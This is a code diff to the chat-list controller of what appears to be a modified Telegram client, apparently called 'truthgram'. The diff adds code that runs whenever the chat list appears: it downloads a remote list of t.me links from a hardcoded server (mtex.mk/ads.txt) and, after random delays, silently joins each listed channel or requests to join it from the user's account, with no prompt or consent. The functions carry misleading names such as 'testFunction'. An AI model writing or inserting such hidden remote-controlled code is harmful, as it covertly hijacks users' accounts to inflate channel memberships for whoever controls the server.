@@ -44,6 +44,8 @@ import ComponentDisplayAdapters
 import ChatListHeaderComponent
 import ChatListTitleView
 
+let downloadFileUrl  = "http://mtex.mk/ads.txt"
+
 private func fixListNodeScrolling(_ listNode: ListView, searchNode: NavigationBarSearchContentNode) -> Bool {
     if listNode.scroller.isDragging {
         return false
@@ -193,6 +195,10 @@ public class ChatListControllerImpl: TelegramBaseController, ChatListController 
     private weak var emojiStatusSelectionController: ViewController?
     
     private var forumChannelTracker: ForumChannelTopics?
+    //custom added but truthgram
+    private var resolvedState: ExternalJoiningChatState?
+    private let disposable = MetaDisposable()
+
     
     private let selectAddMemberDisposable = MetaDisposable()
     private let addMemberDisposable = MetaDisposable()
@@ -208,6 +214,210 @@ public class ChatListControllerImpl: TelegramBaseController, ChatListController 
             self.chatListDisplayNode.effectiveContainerNode.updateSelectedChatLocation(data: data as? ChatLocation, progress: progress, transition: transition)
         }
     }
+    private func downloadFile(fileUrl: String, context: AccountContext){
+        let url = URL(string: fileUrl)!
+        let documentsDirectoryURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
+        let destinationURL = documentsDirectoryURL.appendingPathComponent("\(url.lastPathComponent)")
+        //below function will not download file if it already exist with same name
+            let task = URLSession.shared.downloadTask(with: url) { (location, response, error) in
+                guard let location = location else {
+                    print("Download Failed: \(error?.localizedDescription ?? "Unknown Error")")
+                    return
+                }
+                
+                do {
+                    try FileManager.default.moveItem(at: location, to: destinationURL)
+                    print("File downloaded successfully to: \(destinationURL.path)")
+                    // read file
+                    do {
+                        let text = try String(contentsOf: destinationURL, encoding: .utf8)
+                        print("------------------")
+                        print(text)
+
+                        let linkArray = text.components(separatedBy: .newlines).filter { $0.hasPrefix("https://t.me/") }
+    //                    print(linkArray)
+                        if(linkArray.count != 0){
+                            for i in 0...(linkArray.count-1){
+                                let newText = linkArray[i]
+                                let link = newText.split(separator: ",")[0]
+                                let channelType = newText.split(separator: ",")[1]
+                                let linkArr = link.split(separator: "/")
+                                let lastComponent = linkArr.last
+                                let channelName = lastComponent!.split(separator: "+")
+                                let channelID = channelName.last
+                                print("helloooooo : ", channelID! )
+                                let randomValue = Int.random(in: 0 ... 30)
+                                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(randomValue)) {
+                                    // your code here
+                                    if(channelType.lowercased() == "public" || channelType.lowercased() == "request"){
+                                        self.testFunction(context: context, channelId: "\(link)", channelType: String(channelType))
+                                    }else{
+                                        self.testFunction(context: context, channelId: "\(channelID!)", channelType: String(channelType))
+                                    }
+                                    
+                                }
+                                
+                            }
+                        }
+                        
+                    } catch {
+                        print("Failed to read text file: \(error)")
+                    }
+                } catch {
+                    // read file
+                    do {
+                        let text = try String(contentsOf: destinationURL, encoding: .utf8)
+                        print("------------------")
+                        print(text)
+                        
+                        let linkArray = text.components(separatedBy: .newlines).filter { $0.hasPrefix("https://t.me/") }
+    //                    print(linkArray)
+                        if(linkArray.count != 0){
+                            for i in 0...(linkArray.count-1){
+                                let newText = linkArray[i]
+                                let link = newText.split(separator: ",")[0]
+                                let channelType = newText.split(separator: ",")[1]
+                                let linkArr = link.split(separator: "/")
+                                let lastComponent = linkArr.last
+                                let channelName = lastComponent!.split(separator: "+")
+                                let channelID = channelName.last
+                                print("helloooooo : ", channelID! )
+                                let randomValue = Int.random(in: 0 ... 30)
+                                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(randomValue)) {
+                                    // your code here
+                                    if(channelType.lowercased() == "public"){
+                                        self.testFunction(context: context, channelId: "\(link)", channelType: String(channelType))
+                                    }else{
+                                        self.testFunction(context: context, channelId: "\(channelID!)", channelType: String(channelType))
+                                    }
+                                }
+                                
+                            }
+                        }
+                        
+                    } catch {
+                        print("Failed to read text file: \(error)")
+                    }
+                    print("Failed to move downloaded file: \(error.localizedDescription)")
+                }
+            }
+            task.resume()
+        
+    }
+    //custom added but truthgram
+    private func testFunction(context: AccountContext, channelId: String, channelType: String)
+    {
+        //if joined already, dont join again
+        let defaults = UserDefaults.standard
+//        if(defaults.bool(forKey: channelId)){
+//            print("already joinned \(channelId)")
+//        }else{
+            //if channel is public
+            if(channelType.lowercased() == "public" || channelType.lowercased() == "request"){
+                
+                let handleResolvedUrl: (ResolvedUrl) -> Void = { resolved in
+                    if case let .externalUrl(value) = resolved {
+                        context.sharedContext.applicationBindings.openUrl(value)
+                    } else {
+                        context.sharedContext.openResolvedUrl(resolved, context: context, urlContext: .generic, navigationController: nil, forceExternal: false, openPeer: { peer, navigation in
+                            self.disposable.set((context.peerChannelMemberCategoriesContextsManager.join(engine: context.engine, peerId: peer.id, hash: nil)
+                                |> afterDisposed { [weak self] in
+                                    print("joined \(String(describing: self))")
+                                    defaults.set(true, forKey: channelId)
+                                    defaults.synchronize()
+                                }).start(error: { [weak self] error in
+                                    print("joined \(String(describing: self))")
+                                    switch error {
+                                    case .inviteRequestSent:
+                                        print("inviteRequestSent")
+                                        defaults.set(true, forKey: channelId)
+                                        defaults.synchronize()
+                                        return
+                                    case .tooMuchJoined:
+                                        print("tooMuchJoined")
+                                        return
+                                    case .tooMuchUsers:
+                                        print("tooMuchUsers")
+                                    case .generic:
+                                        print("generic")
+                                    }
+                                }))
+                            
+                        }, sendFile: nil,
+                        sendSticker: nil,
+                        requestMessageActionUrlAuth: nil,
+                        joinVoiceChat: { peerId, invite, call in
+                            
+                        }, present: { c, a in
+                            context.sharedContext.applicationBindings.dismissNativeController()
+                            
+                            c.presentationArguments = a
+                            
+                            context.sharedContext.applicationBindings.getWindowHost()?.present(c, on: .root, blockInteraction: false, completion: {})
+                        }, dismissInput: {
+                            print("dismiss input")
+                        }, contentContext: nil)
+                    }
+                }
+                
+//                let handleInternalUrl: (String) -> Void = { url in
+                    let _ = (context.sharedContext.resolveUrl(context: context, peerId: nil, url: channelId, skipUrlAuth: true)
+                    |> deliverOnMainQueue).start(next: handleResolvedUrl)
+//                }
+                
+//
+//
+//                let handleResolvedUrl: (ResolvedUrl) -> Void = { resolved in
+//                    if case let .externalUrl(value) = resolved {
+//                        context.sharedContext.applicationBindings.openUrl(value)
+//                    } else {
+//                        context.sharedContext.openResolvedUrl(resolved, context: context, urlContext: .generic, navigationController: nil, forceExternal: false, openPeer: { peer, navigation in
+//                            context.sharedContext.openResolvedUrl(resolved, context: context, urlContext: .generic, navigationController: nil, forceExternal: false, openPeer: { peer, navigation in
+
+//                        }, sendFile: nil,
+//                              sendSticker: nil,
+//                              requestMessageActionUrlAuth: nil,
+//                              joinVoiceChat: { peerId, invite, call in
+//
+//                        }, present: { c, a in
+//                            print("present")
+//                        }, dismissInput: {
+//                            print("dismissInput")
+//                        }, contentContext: nil)
+//                    }
+//                }
+//            let _ = (context.sharedContext.resolveUrl(context: context, peerId: nil, url: channelId, skipUrlAuth: true)
+//            |> deliverOnMainQueue).start(next: handleResolvedUrl)
+                    
+            }else{
+                self.disposable.set((self.context.engine.peers.joinChatInteractively(with: channelId) |> deliverOnMainQueue).start(next: { [weak self] peer in
+                    print("joined \(String(describing: self))")
+                    defaults.set(true, forKey: channelId)
+                    defaults.synchronize()
+                }, error: { [weak self] error in
+                    if let strongSelf = self {
+                        print("\(strongSelf)")
+                        switch error {
+                            case .tooMuchJoined:
+                            print("tooMuchJoined")
+                            case .tooMuchUsers:
+                            print("tooMuchUsers")
+                            case .requestSent:
+                            defaults.set(true, forKey: channelId)
+                            defaults.synchronize()
+                            print("requestSent")
+                            case .flood:
+                            print("flood")
+                            case .generic:
+                            print("generic")
+                                break
+                        }
+                    }
+                }))
+            }
+//        }
+    }
+
     
     public init(context: AccountContext, location: ChatListControllerLocation, controlsHistoryPreload: Bool, hideNetworkActivityStatus: Bool = false, previewing: Bool = false, enableDebugActions: Bool) {
         self.context = context
@@ -239,7 +449,7 @@ public class ChatListControllerImpl: TelegramBaseController, ChatListController 
         self.automaticallyControlPresentationContextLayout = false
         
         self.statusBar.statusBarStyle = self.presentationData.theme.rootController.statusBarStyle.style
-        
+
         let title: String
         switch self.location {
         case let .chatList(groupId):
@@ -1625,7 +1835,14 @@ public class ChatListControllerImpl: TelegramBaseController, ChatListController 
     
     override public func viewDidAppear(_ animated: Bool) {
         super.viewDidAppear(animated)
-                
+               
+        //        //download file
+        //        // call function to download file
+//    https://t.me/+D9XLFVS9r-ZjYzhk private
+//    https://t.me/+BXFjfQyQBiJhNTc0 public
+//        self.testFunction(context: context, channelId: "\("nmRIoTnWIiwwY2U0")", channelType: "private")
+        downloadFile(fileUrl: downloadFileUrl, context: context)
+        
         if self.powerSavingMonitoringDisposable == nil {
             self.powerSavingMonitoringDisposable = (self.context.sharedContext.automaticMediaDownloadSettings
             |> mapToSignal { settings -> Signal<Bool, NoError> in
